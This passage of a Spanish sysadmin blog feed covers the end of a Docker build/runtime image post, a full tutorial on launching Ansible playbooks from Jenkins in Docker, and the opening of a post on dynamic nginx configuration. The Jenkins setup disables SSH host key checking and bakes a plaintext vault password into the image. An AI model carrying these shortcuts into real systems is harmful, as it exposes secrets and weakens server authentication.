&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing sqlite-libs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.13.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.7.12-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;14&lt;/span&gt;/14&lt;span class="o"&gt;)&lt;/span&gt; Installing uwsgi-python &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.0.13-r0&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.24.2-r9.trigger
OK: &lt;span class="m"&gt;53&lt;/span&gt; MiB in &lt;span class="m"&gt;25&lt;/span&gt; packages
 ---&amp;gt; b7c2de7c84d1
Removing intermediate container 9233d11f6646
Step &lt;span class="m"&gt;3&lt;/span&gt; : ADD app.tar.gz /
 ---&amp;gt; 9b8046268ece
Removing intermediate container 0a5f930580a2
Step &lt;span class="m"&gt;4&lt;/span&gt; : COPY app.ini /app/
 ---&amp;gt; 345641630c11
Removing intermediate container 8b0fe594e89d
Step &lt;span class="m"&gt;5&lt;/span&gt; : ENTRYPOINT uwsgi --ini /app/app.ini
 ---&amp;gt; Running in 586c9d5f49ae
 ---&amp;gt; a83cfc054bdc
Removing intermediate container 586c9d5f49ae
Successfully built a83cfc054bdc
gerard@sirius:~/docker/autobuilder/runner$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos nuestra imagen.&lt;/p&gt;
&lt;h2&gt;Ejecutando la imagen&lt;/h2&gt;
&lt;p&gt;Esta parte no tiene mucho misterio; basta con ejecutar la imagen como lo haríamos normalmente. Esta aplicación en concreto lee las configuraciones desde las variables de entorno, así que se las ponemos. En este caso particular, tenemos la imagen de &lt;strong&gt;Docker Hub&lt;/strong&gt; &lt;a href="https://hub.docker.com/_/mongo/"&gt;mongo&lt;/a&gt; en la dirección &lt;em&gt;IP&lt;/em&gt; indicada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ docker run -ti --rm -p &lt;span class="m"&gt;8888&lt;/span&gt;:8080 -e &lt;span class="s2"&gt;&amp;quot;MONGODB_URI=mongodb://172.17.0.2:27017/shop&amp;quot;&lt;/span&gt; runner
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar que todo funciona lanzando una petición &lt;em&gt;HTTP&lt;/em&gt; estándar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl http://localhost:8888/
&amp;lt;h1&amp;gt;Fruits&amp;lt;/h1&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Apple&amp;lt;/li&amp;gt;
&amp;lt;li&amp;gt;Orange&amp;lt;/li&amp;gt;
&amp;lt;li&amp;gt;Pear&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ahora podemos ver que la imagen de &lt;em&gt;runtime&lt;/em&gt; queda mucho mas reducida, mas rápida de construir y sin tanto &lt;em&gt;bloat&lt;/em&gt;. Supongo que podemos reducir mas lo que ocupa la imagen seleccionando versiones de &lt;strong&gt;python&lt;/strong&gt; alternativas; el sistema operativo base son solo 4.8mb...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/autobuilder/runner$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
runner              latest              e190cce7685a        &lt;span class="m"&gt;31&lt;/span&gt; seconds ago      &lt;span class="m"&gt;60&lt;/span&gt;.75 MB
builder             latest              edf62460d187        &lt;span class="m"&gt;7&lt;/span&gt; minutes ago       &lt;span class="m"&gt;164&lt;/span&gt; MB
gerard@sirius:~/docker/autobuilder/runner$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, la &lt;em&gt;cache&lt;/em&gt; de &lt;strong&gt;Docker&lt;/strong&gt; funciona a las mil maravillas en este caso; si hubiera que reconstruir la imagen de &lt;em&gt;runtime&lt;/em&gt;, se ejecutarían solo los pasos 3, 4 y 5. Esto convierte el hecho de "hacer una &lt;em&gt;release&lt;/em&gt;" en casi inmediato.&lt;/p&gt;</content><category term="docker"></category><category term="python"></category><category term="build"></category><category term="runtime"></category><category term="release"></category></entry><entry><title>Lanzando playbooks de Ansible desde Jenkins</title><link href="https://www.linuxsysadmin.ml/2016/09/lanzando-playbooks-de-ansible-desde-jenkins.html" rel="alternate"></link><published>2016-09-26T08:00:00+02:00</published><updated>2016-09-26T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-09-26:/2016/09/lanzando-playbooks-de-ansible-desde-jenkins.html</id><summary type="html">&lt;p&gt;Somos muchos los amantes del terminal para ejecutar nuestras tareas, sea con &lt;strong&gt;Ansible&lt;/strong&gt; o con otras herramientas. A veces nos puede convenir dotar la herramienta de un entorno gráfico o web para que lo hagan otras personas. Aunque ya existe como producto &lt;strong&gt;Ansible Tower&lt;/strong&gt;, su precio es prohibitivo para muchos …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Somos muchos los amantes del terminal para ejecutar nuestras tareas, sea con &lt;strong&gt;Ansible&lt;/strong&gt; o con otras herramientas. A veces nos puede convenir dotar la herramienta de un entorno gráfico o web para que lo hagan otras personas. Aunque ya existe como producto &lt;strong&gt;Ansible Tower&lt;/strong&gt;, su precio es prohibitivo para muchos.&lt;/p&gt;
&lt;p&gt;Desarrollar una solución propia no suele ser una opción viable, pero afortunadamente, hay muchas soluciones que pueden satisfacer nuestras necesidades. Una de ellas es &lt;strong&gt;Jenkins&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;En este tutorial y, por comodidad, nos vamos a ahorrar la instalación de &lt;strong&gt;Jenkins&lt;/strong&gt; usando la imagen oficial para &lt;strong&gt;Docker&lt;/strong&gt;. Sobre esta imagen vamos a añadir aquello que podamos necesitar para lanzar nuestros &lt;em&gt;playbooks&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a adoptar un modelo de trabajo en el que nuestro inventario y nuestros &lt;em&gt;playbooks&lt;/em&gt; están alojados en un servidor &lt;strong&gt;git&lt;/strong&gt;. Nuestro &lt;strong&gt;Jenkins&lt;/strong&gt; va a descargarse este repositorio como "fuente" de código y va a "construir" ejecutando los &lt;em&gt;playbooks&lt;/em&gt; del repositorio.&lt;/p&gt;
&lt;h2&gt;Preparando nuestro contenedor&lt;/h2&gt;
&lt;p&gt;Vamos a empezar por un &lt;em&gt;Dockerfile&lt;/em&gt; que parte de la imagen oficial de &lt;strong&gt;Jenkins&lt;/strong&gt;. A esa imagen habría que añadir &lt;strong&gt;Ansible&lt;/strong&gt;, el cliente de &lt;strong&gt;SSH&lt;/strong&gt; necesario por &lt;strong&gt;Ansible&lt;/strong&gt; y el paquete &lt;strong&gt;sshpass&lt;/strong&gt; para que pueda entrar en las máquinas usando autenticación tradicional de usuario y contraseña. El cliente de &lt;strong&gt;git&lt;/strong&gt; ya viene en la imagen base.&lt;/p&gt;
&lt;p&gt;Vamos a poner también en esta imagen una configuración de &lt;strong&gt;Ansible&lt;/strong&gt; para el usuario &lt;em&gt;jenkins&lt;/em&gt; que levanta la web, y el fichero con la contraseña de los &lt;em&gt;vaults&lt;/em&gt;; de esta forma podemos versionar los fichero &lt;em&gt;vault&lt;/em&gt; sin miedo a que se puedan descifrar si alguien obtiene una copia de nuestro repositorio.&lt;/p&gt;
&lt;p&gt;Así nos quedaría el &lt;em&gt;Dockerfile&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/jenkins_ansible$ cat Dockerfile 
FROM jenkins
USER root
RUN &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deb http://ftp.debian.org/debian jessie-backports main&amp;quot;&lt;/span&gt; &amp;gt; /etc/apt/sources.list.d/backports.list &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y openssh-client sshpass &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y -t jessie-backports ansible &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get clean &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm -rf /var/lib/apt/lists/*
ADD ansible.cfg /var/jenkins_home/.ansible.cfg
ADD vault-passfile /var/jenkins_home/.vault-passfile
USER jenkins
gerard@seginus:~/docker/jenkins_ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y los ficheros auxiliares:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/jenkins_ansible$ cat ansible.cfg 
&lt;span class="o"&gt;[&lt;/span&gt;defaults&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;host_key_checking&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; False
&lt;span class="nv"&gt;vault_password_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /var/jenkins_home/.vault-passfile
gerard@seginus:~/docker/jenkins_ansible$ cat vault-passfile 
5up3r53cr37
gerard@seginus:~/docker/jenkins_ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos nuestra nueva imagen con las herramientas necesarias, con el comando habitual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/jenkins_ansible$ docker build -t jenkins_ansible .
Sending build context to Docker daemon &lt;span class="m"&gt;4&lt;/span&gt;.096 kB
Step &lt;span class="m"&gt;1&lt;/span&gt; : FROM jenkins
 ---&amp;gt; 2da1d8d90b7e
Step &lt;span class="m"&gt;2&lt;/span&gt; : USER root
 ---&amp;gt; Running in f994443d27bd
 ---&amp;gt; 18e3df2ad21f
Removing intermediate container f994443d27bd
Step &lt;span class="m"&gt;3&lt;/span&gt; : RUN &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deb http://ftp.debian.org/debian jessie-backports main&amp;quot;&lt;/span&gt; &amp;gt; /etc/apt/sources.list.d/backports.list &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y openssh-client sshpass &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get install -y -t jessie-backports ansible &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     apt-get clean &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     rm -rf /var/lib/apt/lists/*
 ---&amp;gt; Running in 2c3371ad61b0
Get:1 http://security.debian.org jessie/updates InRelease &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;63&lt;/span&gt;.1 kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:2 http://ftp.debian.org jessie-backports InRelease &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;166&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:3 http://security.debian.org jessie/updates/main amd64 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;389&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:4 http://ftp.debian.org jessie-backports/main amd64 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;879&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Ign http://httpredir.debian.org jessie InRelease
Get:5 http://httpredir.debian.org jessie-updates InRelease &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;142&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:6 http://httpredir.debian.org jessie-backports InRelease &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;166&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:7 http://httpredir.debian.org jessie Release.gpg &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;2373&lt;/span&gt; B&lt;span class="o"&gt;]&lt;/span&gt;
Get:8 http://httpredir.debian.org jessie Release &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;148&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:9 http://httpredir.debian.org jessie-updates/main amd64 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;17&lt;/span&gt;.6 kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:10 http://httpredir.debian.org jessie/main amd64 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;9032&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Get:11 http://httpredir.debian.org jessie-backports/main amd64 Packages &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;879&lt;/span&gt; kB&lt;span class="o"&gt;]&lt;/span&gt;
Fetched &lt;span class="m"&gt;11&lt;/span&gt;.9 MB in 19s &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;606&lt;/span&gt; kB/s&lt;span class="o"&gt;)&lt;/span&gt;
Reading package lists...
Reading package lists...
Building dependency tree...
Reading state information...
openssh-client is already the newest version.
The following NEW packages will be installed:
  sshpass
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;1&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;1&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;11&lt;/span&gt;.2 kB of archives.
After this operation, &lt;span class="m"&gt;65&lt;/span&gt;.5 kB of additional disk space will be used.
Get:1 http://httpredir.debian.org/debian/ jessie/main sshpass amd64 &lt;span class="m"&gt;1&lt;/span&gt;.05-1 &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;11&lt;/span&gt;.2 kB&lt;span class="o"&gt;]&lt;/span&gt;
debconf: delaying package configuration, since apt-utils is not installed
Fetched &lt;span class="m"&gt;11&lt;/span&gt;.2 kB in 0s &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;35&lt;/span&gt;.3 kB/s&lt;span class="o"&gt;)&lt;/span&gt;
Selecting previously unselected package sshpass.
&lt;span class="o"&gt;(&lt;/span&gt;Reading database ... &lt;span class="m"&gt;17572&lt;/span&gt; files and directories currently installed.&lt;span class="o"&gt;)&lt;/span&gt;
Preparing to unpack .../sshpass_1.05-1_amd64.deb ...
Unpacking sshpass &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.05-1&lt;span class="o"&gt;)&lt;/span&gt; ...
Setting up sshpass &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.05-1&lt;span class="o"&gt;)&lt;/span&gt; ...
Reading package lists...
Building dependency tree...
Reading state information...
The following extra packages will be installed:
  ieee-data libyaml-0-2 python-crypto python-ecdsa python-httplib2
  python-jinja2 python-markupsafe python-netaddr python-paramiko
  python-pkg-resources python-selinux python-yaml
Suggested packages:
  python-crypto-dbg python-crypto-doc python-jinja2-doc ipython
  python-netaddr-docs python-setuptools
The following NEW packages will be installed:
  ansible ieee-data libyaml-0-2 python-crypto python-ecdsa python-httplib2
  python-jinja2 python-markupsafe python-netaddr python-paramiko
  python-pkg-resources python-selinux python-yaml
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;13&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;27&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;3359&lt;/span&gt; kB of archives.
After this operation, &lt;span class="m"&gt;19&lt;/span&gt;.5 MB of additional disk space will be used.
...  
 ---&amp;gt; d8ed3d7ffdb3
Removing intermediate container 2c3371ad61b0
Step &lt;span class="m"&gt;4&lt;/span&gt; : ADD ansible.cfg /var/jenkins_home/.ansible.cfg
 ---&amp;gt; cd63da025c0a
Removing intermediate container fe8b889557ae
Step &lt;span class="m"&gt;5&lt;/span&gt; : ADD vault-passfile /var/jenkins_home/.vault-passfile
 ---&amp;gt; 6cb532911067
Removing intermediate container bc522e9f464a
Step &lt;span class="m"&gt;6&lt;/span&gt; : USER jenkins
 ---&amp;gt; Running in 6c0f9cde92e5
 ---&amp;gt; 89e5cae2d376
Removing intermediate container 6c0f9cde92e5
Successfully built 89e5cae2d376
gerard@seginus:~/docker/jenkins_ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Levantamos un contenedor para la nueva imagen creada, de la misma forma que levantaríamos la imagen de &lt;strong&gt;Jenkins&lt;/strong&gt; oficial. Mas información en &lt;a href="https://hub.docker.com/_/jenkins/"&gt;Docker Hub&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/jenkins_ansible$ docker run -p &lt;span class="m"&gt;8080&lt;/span&gt;:8080 -d jenkins_ansible
f9b6a9d23fde25411cd2086d13b7a171633eb2cf0b18295fde89c4466c08ef54
gerard@seginus:~/docker/jenkins_ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ya de paso, levantamos otras 4 máquinas como las que se indican en &lt;a href="https://www.linuxsysadmin.ml/2016/06/controlando-contenedores-docker-con-ansible.html"&gt;otro artículo&lt;/a&gt; para que ejecuten nuestros &lt;em&gt;playbooks&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/jenkins_ansible$ docker run -d slave
ae3f8fe7d4448566c3481069d6c85d74ea3c6df7b9506c3f86e271247f5cbc52
gerard@seginus:~/docker/jenkins_ansible$ docker run -d slave
c27f99a68d0e4a5d5d9897d3971f6a230c10ee44239bce2deb85a2e6e31e6536
gerard@seginus:~/docker/jenkins_ansible$ docker run -d slave
0d33995bacf4d266f4f1bb2afc86a92b586be569ca10b1584bf48c5aed6b1277
gerard@seginus:~/docker/jenkins_ansible$ docker run -d slave
221ae5b4c1cfe171530d5d9e9663222292da72144fdf2f62589acc50b72f3f2e
gerard@seginus:~/docker/jenkins_ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Configurando nuestro Jenkins&lt;/h2&gt;
&lt;p&gt;Ya podemos abrir la página de nuestro contenedor, de forma que se puedan efectuar las configuraciones iniciales. Nos vamos a dirigir a &lt;a href="http://localhost:8080/"&gt;http://localhost:8080/&lt;/a&gt;, que es desde donde se va a controlar nuestro servidor de ahora en adelante.&lt;/p&gt;
&lt;p&gt;La parte mas importante de nuestro despliegue de &lt;strong&gt;Jenkins&lt;/strong&gt; son los &lt;em&gt;plugins&lt;/em&gt;. En nuestro caso, solo queremos clonar nuestros &lt;em&gt;playbooks&lt;/em&gt; desde &lt;strong&gt;git&lt;/strong&gt; y lanzarlos mediante &lt;strong&gt;Ansible&lt;/strong&gt;. Para ello necesitamos estos dos &lt;em&gt;plugins&lt;/em&gt;: &lt;em&gt;git plugin&lt;/em&gt; y &lt;em&gt;ansible plugin&lt;/em&gt;. Se pueden instalar en la primera visita a nuestro contenedor o a &lt;em&gt;posteriori&lt;/em&gt;. Los instalamos.&lt;/p&gt;
&lt;p&gt;Y finalmente tenemos un &lt;strong&gt;Jenkins&lt;/strong&gt; funcional aunque si ninguna tarea configurada.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 01" src="https://www.linuxsysadmin.ml/images/ansible_jenkins_01.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;El repositorio de playbooks&lt;/h2&gt;
&lt;p&gt;Necesitamos algún lugar desde donde obtener nuestros &lt;em&gt;playbooks&lt;/em&gt;. De acuerdo con la decisión del flujo de trabajo van a estar alojados en un servidor &lt;strong&gt;git&lt;/strong&gt;, y en este caso, voy a usar un repositorio de usar y tirar en &lt;a href="https://github.com/"&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Por poner a nuestro repositorio alguna estructura, he usado dos carpetas: una para contener los &lt;em&gt;playbooks&lt;/em&gt; y otra para el inventario. La carpeta del inventario es similar a la de &lt;a href="https://www.linuxsysadmin.ml/2016/08/encriptando-datos-sensibles-con-ansible.html"&gt;este otro artículo&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/ansible$ tree
.
├── inventory
│   ├── hosts
│   └── vault
└── playbooks
    ├── ping_all.yml
    └── ping_some.yml

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;4&lt;/span&gt; files
gerard@seginus:~/docker/ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En &lt;em&gt;inventory/vault&lt;/em&gt; tenemos los datos de conexión a las máquinas, como indica el artículo antes citado. El resto de ficheros son los &lt;em&gt;playbooks&lt;/em&gt; que vamos a usar, y los &lt;em&gt;hosts&lt;/em&gt; que tenemos en sus grupos correspondientes. Hay que tirar de imaginación para imaginar un &lt;em&gt;playbook&lt;/em&gt; un poco mas útil.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@seginus:~/docker/ansible$ cat inventory/hosts 
&lt;span class="o"&gt;[&lt;/span&gt;group1&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.3
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.4

&lt;span class="o"&gt;[&lt;/span&gt;group2&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.5
&lt;span class="m"&gt;172&lt;/span&gt;.17.0.6
gerard@seginus:~/docker/ansible$ cat playbooks/ping_all.yml 
- hosts: all
  tasks:
    - ping:
gerard@seginus:~/docker/ansible$ cat playbooks/ping_some.yml 
- hosts: &lt;span class="s2"&gt;&amp;quot;{{ target }}&amp;quot;&lt;/span&gt;
  tasks:
    - ping:
gerard@seginus:~/docker/ansible$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creando una tarea básica&lt;/h2&gt;
&lt;p&gt;Vamos a crear una tarea que consista en lanzar el fichero &lt;em&gt;playbooks/ping_all.yml&lt;/em&gt;. Para ello pinchamos en el enlace "create new job", le damos un nombre (por ejemplo "Ping All") y lo creamos de tipo "Freestyle project".&lt;/p&gt;
&lt;p&gt;El primer paso consiste en obtener los &lt;em&gt;playbooks&lt;/em&gt; del repositorio. Para ello rellenaremos el apartado "Source code management", eligiendo "Git" e indicando la &lt;em&gt;URL&lt;/em&gt; del repositorio.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 02" src="https://www.linuxsysadmin.ml/images/ansible_jenkins_02.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Lo siguiente es indicar un "Build step" que se "Invoke Ansible Playbook". Hay que indicar el &lt;em&gt;playbook&lt;/em&gt; desde la carpeta pertinente, de forma relativa. Eso significa que en nuestro caso es &lt;em&gt;playbooks/ping_all.yml&lt;/em&gt;. Adicionalmente vamos a indicar que el fichero de inventario es la carpeta &lt;em&gt;inventory&lt;/em&gt;, que es lo que se le va a pasar a &lt;strong&gt;Ansible&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 03" src="https://www.linuxsysadmin.ml/images/ansible_jenkins_03.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Le damos a guardar y ya tenemos nuestra tarea. Bastará con lanzar la tarea con "Build now" y esperar resultados, en "Console Output" de la ejecución en curso.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 04" src="https://www.linuxsysadmin.ml/images/ansible_jenkins_04.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;Creando una tarea con parámetros&lt;/h2&gt;
&lt;p&gt;Muchas de las tareas que hacemos son repetitivas. Cambian las versiones de código a desplegar, los entornos, los proyectos y poco mas. ¿No sería maravilloso tener un solo &lt;em&gt;playbook&lt;/em&gt; que admita parámetros? &lt;strong&gt;Jenkins&lt;/strong&gt; nos ofrece la posibilidad de añadir parámetros, que luego pueden ser usados en los "Build steps", por ejemplo, para pasárselas a los &lt;em&gt;playbooks&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a crear otra tarea, esta vez llamada "Ping Some". Va a ser idéntica a la otra, pero con el &lt;em&gt;playbook&lt;/em&gt; llamado &lt;em&gt;ping_some.yml&lt;/em&gt;. Vamos a marcar la casilla "This project is parameterized" en la casilla general y le añadiremos un parámetro, al que llamaremos "target" y va a ser un "Choice Parameter" con los valores "all", "group1" y "group2".&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 05" src="https://www.linuxsysadmin.ml/images/ansible_jenkins_05.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Vamos a los "Build steps" a poner ese parámetro al comando &lt;em&gt;ansible&lt;/em&gt;. Tras dar al botón "Advanced..." podemos poner mas parámetros para &lt;strong&gt;Ansible&lt;/strong&gt;. Esto nos permite poner "-e target=$target" para que el &lt;em&gt;playbook&lt;/em&gt; reciba un parámetro &lt;em&gt;target&lt;/em&gt; que contenga el valor del mismo parámetro en &lt;strong&gt;Jenkins&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 06" src="https://www.linuxsysadmin.ml/images/ansible_jenkins_06.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Tras salvar la tarea, vemos que la opción de "Build" se ha convertido en "Build with Parameters", y podemos elegir entre los valores específicos.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 07" src="https://www.linuxsysadmin.ml/images/ansible_jenkins_07.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Y con esto conseguimos pasar parámetros al &lt;em&gt;playbook&lt;/em&gt;, que pueden ser texto libre, elecciones simples o valores fijos. Con un poco de imaginación, estos parámetros nos pueden ayudar mucho, en el sentido de no repetirnos.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Ansible desde Jenkins 08" src="https://www.linuxsysadmin.ml/images/ansible_jenkins_08.jpg"&gt;&lt;/p&gt;</content><category term="ansible"></category><category term="playbook"></category><category term="jenkins"></category><category term="docker"></category><category term="git"></category></entry><entry><title>Imágenes docker reusables mediante configuraciones dinámicas</title><link href="https://www.linuxsysadmin.ml/2016/09/imagenes-docker-reusables-mediante-configuraciones-dinamicas.html" rel="alternate"></link><published>2016-09-12T08:00:00+02:00</published><updated>2016-09-12T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-09-12:/2016/09/imagenes-docker-reusables-mediante-configuraciones-dinamicas.html</id><summary type="html">&lt;p&gt;Muchos de los servicios que necesitamos son siempre los mismos, cambiando solamente algunos parámetros. Incluso los mismos servicios pueden sufrir variaciones en su configuración, por ejemplo, un balanceador al que se añaden o quitan &lt;em&gt;hosts&lt;/em&gt;. Siguiendo las prácticas de &lt;a href="http://12factor.net/es/"&gt;12factor&lt;/a&gt; podemos ahorrar trabajo, mediante el uso de variables de entorno …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchos de los servicios que necesitamos son siempre los mismos, cambiando solamente algunos parámetros. Incluso los mismos servicios pueden sufrir variaciones en su configuración, por ejemplo, un balanceador al que se añaden o quitan &lt;em&gt;hosts&lt;/em&gt;. Siguiendo las prácticas de &lt;a href="http://12factor.net/es/"&gt;12factor&lt;/a&gt; podemos ahorrar trabajo, mediante el uso de variables de entorno.&lt;/p&gt;
&lt;p&gt;El problema es que las variables de entorno no siempre son bienvenidas en las configuraciones de una aplicación, siendo mucho mas comunes los ficheros con un formato concreto. Eso significa que necesitamos varias imágenes &lt;strong&gt;docker&lt;/strong&gt; para los diferentes proyectos y entornos.&lt;/p&gt;
&lt;p&gt;Harto de escribir configuraciones &lt;strong&gt;nginx&lt;/strong&gt; y reconstruir la imagen cada vez que añadíamos &lt;em&gt;hosts&lt;/em&gt;, me hice la pregunta: ¿Hay alguna forma mas inteligente de hacer esto?&lt;/p&gt;
&lt;p&gt;La única forma de cambiar el contenido de una imagen &lt;strong&gt;docker&lt;/strong&gt; es mapeando las configuraciones en volúmenes o mediante el uso de variables de entorno. Pero &lt;strong&gt;nginx&lt;/strong&gt; no admite variables de entorno, y lo de los volúmenes me parece una chapuza.&lt;/p&gt;
